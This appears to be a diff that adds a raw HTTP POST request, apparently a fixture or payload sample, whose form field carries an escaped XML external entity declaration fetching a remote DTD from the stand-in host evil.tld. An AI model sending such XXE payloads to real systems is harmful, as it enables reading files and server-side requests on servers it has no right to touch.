@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+Connection: close
+
+cmd=\u003C!ENTITY % remote SYSTEM \u0022http://evil.tld/x.dtd\u0022\u003E%remote\u003B
